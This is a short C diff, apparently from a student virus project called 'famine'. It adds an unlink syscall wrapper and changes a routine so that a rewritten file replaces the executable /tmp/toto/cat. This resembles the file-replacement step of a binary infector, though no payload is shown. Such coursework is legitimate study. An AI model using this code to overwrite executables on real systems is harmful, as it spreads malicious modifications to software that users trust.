@@ -137,6 +137,7 @@ __syscall0(pid_t, getpid);
 __syscall0(pid_t, fork);
 __syscall1(int, close, int, fd);
 __syscall1(void, exit, int, status);
+__syscall1(int, unlink, const char *, pathname);
 
 __syscall2(int, munmap, void *, addr, size_t, length);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
@@ -663,12 +664,14 @@ static void new_file(char buf[],size_t size, size_t end_of_text,char *path)
 	ft_putchar('\n');
 	//printf("tmp %s, path %s\n",tmp, path);
 	close(fd);
-	int ret = rename (tmp, "/root/42_project/famine/a");
-	ft_putstr("fin memove ");
-	ft_putnbr(ret);
-	ft_putchar('\n');
+
 	char argv[] = "mv /tmp/toto/.cat /tmp/toto/cat";
 	//system(argv);
+	unlink("/tmp/toto/cat");
+	int ret = rename (tmp, "/tmp/toto/cat");
+	ft_putstr("fin rename ");
+	ft_putnbr(ret);
+	ft_putchar('\n');
 
 }
 unsigned long get_eip(void)
